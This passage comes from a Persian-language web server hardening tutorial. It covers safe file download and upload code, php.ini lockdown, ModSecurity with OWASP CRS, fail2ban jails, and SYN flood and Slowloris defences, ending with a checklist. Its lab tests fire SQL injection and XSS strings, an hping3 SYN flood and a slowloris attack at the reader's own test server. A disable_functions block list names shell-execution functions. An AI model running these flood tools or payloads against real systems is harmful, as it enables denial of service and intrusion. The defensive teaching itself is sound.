            # فقط فایل‌های مجاز
        }
    }

    location / {
        try_files $uri $uri/ =404;
    }
}
```

**اپ امن برای دانلود:**

```python
from pathlib import Path
from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse

app = FastAPI()
BASE = Path("/var/files").resolve()

@app.get("/download/{name}")
def download(name: str):
    if "/" in name or "\\" in name or name.startswith("."):
        raise HTTPException(400)

    path = (BASE / name).resolve()
    if BASE not in path.parents and path != BASE:
        raise HTTPException(403)

    if not path.is_file():
        raise HTTPException(404)

    return FileResponse(path, filename=name)
```

**آپلود امن:**

```python
import secrets
from pathlib import Path
from fastapi import FastAPI, UploadFile, HTTPException

app = FastAPI()
UPLOAD = Path("/var/uploads")
UPLOAD.mkdir(exist_ok=True)

ALLOWED = {"image/jpeg", "image/png", "image/webp"}
MAX = 8 * 1024 * 1024

@app.post("/upload")
async def upload(file: UploadFile):
    if file.content_type not in ALLOWED:
        raise HTTPException(415, "unsupported type")

    data = await file.read(MAX + 1)
    if len(data) > MAX:
        raise HTTPException(413, "too large")

    # بررسی magic bytes
    if not (data.startswith(b"\xff\xd8") or data.startswith(b"\x89PNG")):
        raise HTTPException(415, "invalid content")

    name = f"{secrets.token_hex(16)}.bin"
    (UPLOAD / name).write_bytes(data)
    return {"name": name}
```

**`php.ini` سخت:**

```ini
allow_url_include = Off
allow_url_fopen = Off
open_basedir = /var/www/lab:/tmp
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec
expose_php = Off
display_errors = Off
log_errors = On
```

**`Host` header امن:**

```nginx
server {
    listen 80 default_server;
    server_name _;
    return 444;
}

server {
    listen 80;
    server_name lab.example.com;
    # ...
}
```

```bash
curl -sS -o /dev/null -w '%{http_code}\n' -H 'Host: evil.com' http://127.0.0.1/
# 000 (اتصال بسته)
```

**تست `X-Content-Type-Options`:**

```bash
echo '<script>alert(1)</script>' > /var/www/lab/x.jpg
curl -sSI http://localhost:8080/x.jpg | grep -Ei 'content-type|x-content'
# Content-Type: image/jpeg
# X-Content-Type-Options: nosniff
```

### مقایسه و الگوهای مختلف

**دفاع در وب‌سرور در برابر اپ**

| | وب‌سرور | اپ |
|---|---|---|
| traversal | ✅ (`alias`) | ✅ (`resolve`) |
| آپلود | ⚠️ (پسوند) | ✅ (محتوا) |
| LFI | ⚠️ | ✅ |
| Host | ✅ | ✅ |

**`deny` در برابر `return 404`**

| | `deny` | `return 404` |
|---|---|---|
| کد | 403 | 404 |
| افشا | ✅ وجود را می‌گوید | ✅ پنهان |

> برای فایل حساس، `404` بهتر است (مهاجم نمی‌فهمد وجود دارد).

**سه سطح دفاع آپلود**

| سطح | ابزار |
|---|---|
| وب‌سرور | `deny` پسوند اجرایی |
| اپ | MIME + magic bytes + حجم |
| ذخیره | خارج از root، نام تصادفی |

**دیدگاه «اپ همه‌چیز را چک می‌کند»**: وب‌سرور اولین خط است. اگر اپ باگ داشته باشد، `deny` پسوند اجرایی نجات می‌دهد.

### اشکال شایع

**۱) `.git` در `DocumentRoot`**
کد کامل لو می‌رود. `deny` یا خارج از root.

**۲) `autoindex on`**
ساختار. خاموش.

**۳) آپلود در `DocumentRoot` با اجرا**
RCE. پوشه‌ی جدا بدون اجرا.

**۴) `Host` بدون لیست سفید**
Host injection.

**۵) `allow_url_include = On`**
RFI. خاموش.

**۶) `open_basedir` نبودن**
LFI گسترده.

**۷) `Content-Length` و `chunked` همزمان**
Smuggling. پروکسی به‌روز.

**۸) `X-Content-Type-Options` نبودن**
MIME sniffing.

**۹) `proxy_pass` داینامیک با ورودی کاربر**
SSRF.

**۱۰) `403` برای فایل حساس**
وجود را تأیید می‌کند. `404`.

### نکات مهم (Tips & Tricks)

- **`deny` برای `.git`/`.env`**.
- **`autoindex off`**.
- **آپلود خارج از root**.
- **`open_basedir`**.
- **`Host` لیست سفید**.
- **`nosniff`**.
- **`resolve()`** در اپ برای مسیر.

### خلاصه فصل

- Traversal با `resolve()` و `alias` بسته می‌شود.
- LFI/RFI با `open_basedir` و `allow_url_*`.
- آپلود: پسوند، MIME، magic bytes، نام تصادفی.
- Misconfiguration رایج‌ترین علت است.
- `Host` و `X-Forwarded-*` را اعتبارسنجی کن.
- `404` بهتر از `403` برای فایل حساس.

**سؤال مروری:** چرا آپلود فایل در `DocumentRoot` با اجازه‌ی اجرا، یک RCE است؟

---

## فصل ۵۹: WAF، `fail2ban`، DDoS و چک‌لیست

### مقدمه

سه لایه‌ی دفاع تکمیلی: **WAF** (فیلتر درخواست)، **`fail2ban`** (بلاک IP مهاجم)، و **DDoS mitigation** (تحمل حجم). و در پایان، چک‌لیست کامل.

### مفاهیم اساسی

**۱) WAF — دو نوع**

| نوع | توضیح |
|---|---|
| Signature-based | الگوی حمله‌ی شناخته‌شده |
| Behavior-based | رفتار غیرعادی |

**۲) `ModSecurity` + OWASP CRS**

```bash
sudo apt install -y libapache2-mod-security2
sudo a2enmod security2
```

```apache
<IfModule security2_module>
    SecRuleEngine On
    SecRequestBodyAccess On
    SecRule REQUEST_HEADERS:Content-Type "text/xml" \
        "id:200000,phase:1,t:lowercase,pass,nolog,ctl:requestBodyProcessor=XML"

    Include /etc/modsecurity/crs/crs-setup.conf
    Include /etc/modsecurity/crs/rules/*.conf
</IfModule>
```

Nginx:

```bash
sudo apt install -y libnginx-mod-http-modsecurity
```

```nginx
modsecurity on;
modsecurity_rules_file /etc/nginx/modsec/main.conf;
```

**۳) CRS — `Paranoia Level`**

| سطح | حساسیت | false positive |
|---|---|---|
| ۱ | پایین | ✅ کم |
| ۲ | متوسط | ⚠️ |
| ۳ | بالا | ❌ |
| ۴ | حداکثر | ❌❌ |

از ۱ شروع کن.

**۴) `fail2ban`**

```ini
# /etc/fail2ban/jail.d/nginx.conf
[nginx-http-auth]
enabled = true
port    = http,https
logpath = /var/log/nginx/error.log

[nginx-badbots]
enabled  = true
port     = http,https
filter   = nginx-badbots
logpath  = /var/log/nginx/access.log
maxretry = 2

[nginx-req-limit]
enabled  = true
filter   = nginx-req-limit
logpath  = /var/log/nginx/error.log
maxretry = 5
findtime = 600
bantime  = 3600
```

```bash
sudo systemctl restart fail2ban
sudo fail2ban-client status
sudo fail2ban-client status nginx-req-limit
sudo fail2ban-client set nginx-req-limit unbanip 203.0.113.45
```

**۵) فیلتر سفارشی برای ۴۰۴**

```ini
# /etc/fail2ban/filter.d/nginx-404.conf
[Definition]
failregex = ^<HOST> - .* "(GET|POST|HEAD).*" 404
ignoreregex =
```

```ini
[nginx-404]
enabled  = true
filter   = nginx-404
logpath  = /var/log/nginx/access.log
maxretry = 30
findtime = 60
bantime  = 600
```

**۶) DDoS — سه نوع**

| نوع | لایه | دفاع |
|---|---|---|
| Volumetric | L3/L4 | CDN، scrubbing |
| Protocol | L4 | SYN cookies، فایروال |
| Application | L7 | rate limit، WAF، cache |

**۷) SYN flood**

```bash
# sysctl
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_max_syn_backlog = 65535
net.ipv4.tcp_synack_retries = 2
```

**۸) Slowloris**

```nginx
client_header_timeout 10s;
client_body_timeout 10s;
send_timeout 10s;
keepalive_timeout 30s;
limit_conn_zone $binary_remote_addr zone=conn:10m;
limit_conn conn 20;
```

**۹) CDN به‌عنوان لایه**

```
کلاینت → CDN (cache، WAF، DDoS) → origin
```

مخفی کردن IP origin (`set_real_ip_from` فقط CIDR CDN).

**۱۰) چک‌لیست hardening**

**شبکه:**
- [ ] فقط ۸۰/۴۴۳ (و SSH محدود) باز
- [ ] فایروال OS + Security Group
- [ ] IPv6 هم پوشش داده شده

**وب‌سرور:**
- [ ] نسخه پنهان و پچ‌شده
- [ ] `server_tokens off` / `ServerTokens Prod` / `removeServerHeader`
- [ ] ماژول غیرضروری حذف
- [ ] `autoindex off`
- [ ] `TRACE` غیرفعال
- [ ] کاربر کم‌دسترسی

**TLS:**
- [ ] TLS 1.2+ فقط
- [ ] `fullchain.pem`
- [ ] HSTS
- [ ] OCSP stapling
- [ ] گواهی مانیتور

**هدرها:**
- [ ] CSP
- [ ] `nosniff`
- [ ] `X-Frame-Options`
- [ ] `Referrer-Policy`
- [ ] `Permissions-Policy`

**محدودیت:**
- [ ] `limit_req` روی login/API
- [ ] `limit_conn`
- [ ] `client_max_body_size`
- [ ] timeoutها

**فایل:**
- [ ] `.git`/`.env` بسته
- [ ] آپلود خارج از root
- [ ] مجوز `644`/`755`
- [ ] `open_basedir`

**عملیات:**
- [ ] لاگ + چرخش
- [ ] مانیتورینگ + هشدار
- [ ] `fail2ban`
- [ ] بکاپ
- [ ] به‌روزرسانی خودکار امنیتی

### مثال‌های عملی

**Lab Scenario: ModSecurity + fail2ban**

```bash
# ۱) نصب
sudo apt install -y libnginx-mod-http-modsecurity nginx-mod-http-modsecurity 2>/dev/null || \
sudo apt install -y libapache2-mod-security2

# ۲) config پایه
sudo mkdir -p /etc/nginx/modsec
sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
sudo sed -i 's/SecRuleEngine DetectionOnly/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf

# ۳) CRS
sudo apt install -y modsecurity-crs
```

```nginx
# /etc/nginx/modsec/main.conf
Include /etc/modsecurity/modsecurity.conf
Include /etc/modsecurity/crs/crs-setup.conf
Include /etc/modsecurity/crs/rules/*.conf
```

```nginx
# در server
modsecurity on;
modsecurity_rules_file /etc/nginx/modsec/main.conf;
```

```bash
sudo nginx -t && sudo systemctl reload nginx

# ۴) تست حمله
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://localhost:8080/?id=1%20UNION%20SELECT%201,2,3'
# 403 (CRS بلاک کرد)

curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://localhost:8080/?q=<script>alert(1)</script>'
# 403
```

**لاگ ModSecurity:**

```bash
sudo tail -5 /var/log/modsec_audit.log
sudo grep -c 'denied' /var/log/modsec_audit.log
```

**`fail2ban` نصب و تنظیم:**

```bash
sudo apt install -y fail2ban

sudo tee /etc/fail2ban/jail.d/web.conf >/dev/null <<'EOF'
[DEFAULT]
bantime  = 3600
findtime = 600
maxretry = 5
backend  = systemd

[sshd]
enabled = true

[nginx-req-limit]
enabled  = true
filter   = nginx-req-limit
logpath  = /var/log/nginx/error.log
maxretry = 5

[nginx-badbots]
enabled  = true
filter   = nginx-badbots
logpath  = /var/log/nginx/access.log
maxretry = 2
EOF

sudo systemctl enable --now fail2ban
sudo fail2ban-client status
```

**تست `fail2ban`:**

```bash
# ۱۰ درخواست به login با نرخ بالا → 429 در error.log
for i in $(seq 1 20); do
  curl -s -o /dev/null http://localhost:8080/login
done

# وضعیت
sudo fail2ban-client status nginx-req-limit
# Banned IP list: 127.0.0.1

# آزاد کردن
sudo fail2ban-client set nginx-req-limit unbanip 127.0.0.1
```

**SYN flood (تست در محیط خودت):**

```bash
sudo sysctl -w net.ipv4.tcp_syncookies=1
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=65535
sudo sysctl -w net.ipv4.tcp_synack_retries=2

# از ماشین دیگر
sudo hping3 -S -p 443 --flood --rand-source 192.168.56.10
```

**Slowloris دفاع:**

```nginx
client_header_timeout 10s;
client_body_timeout 10s;
send_timeout 10s;
keepalive_timeout 30s;
```

```bash
# تست
slowloris lab.example.com -s 500 -p 443
# با timeout، اتصال‌ها بسته می‌شوند
```

**CDN و `real_ip`:**

```nginx
# Cloudflare
set_real_ip_from 173.245.48.0/20;
set_real_ip_from 103.21.244.0/22;
# ... (لیست کامل از cloudflare.com/ips)
real_ip_header CF-Connecting-IP;
real_ip_recursive on;
```

**بازرسی نهایی:**

```bash
# پورت‌های باز
sudo ss -ltnp

# نسخه
curl -sSI https://lab.example.com/ | grep -i server

# هدرها
curl -sSI https://lab.example.com/ | grep -Ei 'strict|x-frame|x-content|content-security|referrer'

# TLS
docker run --rm -it drwetter/testssl.sh --quiet --severity HIGH https://lab.example.com

# فایل حساس
for p in .git/config .env config.php.bak .htaccess; do
  printf '%-18s → ' "$p"
  curl -sS -o /dev/null -w '%{http_code}\n' "https://lab.example.com/$p"
done
```

### مقایسه و الگوهای مختلف

**WAF در برابر `fail2ban` در برابر rate limit**

| | WAF | fail2ban | rate limit |
|---|---|---|---|
| لایه | درخواست | IP | نرخ |
| تأخیر | ⚠️ | ✅ | ✅ |
| false positive | ⚠️ | ✅ | ✅ |
| مناسب | حمله‌ی شناخته‌شده | تکرار | حجم |

**CRS Paranoia ۱ در برابر ۲**

| | PL1 | PL2 |
|---|---|---|
| امنیت | ✅ | ✅✅ |
| false positive | ✅ کم | ⚠️ |
| توصیه | ✅ شروع | بعد از تنظیم |

**CDN در برابر WAF محلی**

| | CDN | محلی |
|---|---|---|
| DDoS | ✅✅ | ⚠️ |
| هزینه | 💰 | ✅ |
| کنترل | ⚠️ | ✅ |
| توصیه | ✅ تولید | داخلی |

**دیدگاه «WAF همه‌چیز را حل می‌کند»**: WAF لایه‌ی تکمیلی است. باگ اپ را نمی‌بندد. کد امن + WAF + rate limit.

### اشکال شایع

**۱) `SecRuleEngine DetectionOnly`**
فقط لاگ، بدون بلاک. `On`.

**۲) CRS PL4 از روز اول**
سایت می‌شکند. PL1.

**۳) `fail2ban` بدون `backend=systemd`**
لاگ خوانده نمی‌شود.

**۴) `fail2ban` خودش را بلاک می‌کند**
`ignoreip = 127.0.0.1/8 ::1 10.0.0.0/8`.

**۵) `bantime` کوتاه**
مهاجم برمی‌گردد. `1h` یا بیشتر.

**۶) `tcp_syncookies` خاموش**
SYN flood.

**۷) timeout پیش‌فرض طولانی**
Slowloris.

**۸) IP origin لو رفته**
CDN بی‌فایده. فایروال origin فقط CIDR CDN.

**۹) WAF بدون به‌روزرسانی**
قواعد قدیمی.

**۱۰) چک‌لیست بدون تست**
«تیک» بدون مدرک.

### نکات مهم (Tips & Tricks)

- **CRS PL1** شروع.
- **`SecRuleEngine On`**.
- **`fail2ban` با `ignoreip`**.
- **`tcp_syncookies`**.
- **timeout کوتاه** برای Slowloris.
- **CDN + `set_real_ip_from`**.
- **چک‌لیست با مدرک**.

### خلاصه فصل

- WAF (ModSecurity + CRS) لایه‌ی تکمیلی.
- `fail2ban` IP مهاجم را بلاک می‌کند.
- DDoS سه نوع، دفاع لایه‌ای.
- Slowloris با timeout.
- CDN برای حجم و DDoS.
- چک‌لیست با مدرک، نه تیک.

**سؤال مروری:** چرا WAF جایگزین کد امن نیست؟

---

## منابع و مراجع

**مستندات رسمی**
- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [Nginx — limit_req](https://nginx.org/en/docs/http/ngx_http_limit_req_module.html)
- [Nginx — limit_conn](https://nginx.org/en/docs/http/ngx_http_limit_conn_module.html)
- [Apache — mod_security](https://github.com/SpiderLabs/ModSecurity)
- [OWASP CRS](https://coreruleset.org/)
- [fail2ban](https://www.fail2ban.org/)

**آموزش**
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Mozilla Observatory](https://observatory.mozilla.org/)
- [Security Headers](https://securityheaders.com/)
- [Nginx hardening guide](https://docs.nginx.com/nginx/admin-guide/security-controls/)

**ابزار**
- [testssl.sh](https://testssl.sh/)
- [nuclei](https://github.com/projectdiscovery/nuclei)
- [nikto](https://github.com/sullo/nikto)
- [ModSecurity CRS](https://github.com/coreruleset/coreruleset)

---

**بعدی:** [`14-URL-Rewriting-and-Redirects.md`](14-URL-Rewriting-and-Redirects.md) — `mod_rewrite`، `return`، SPA و canonical
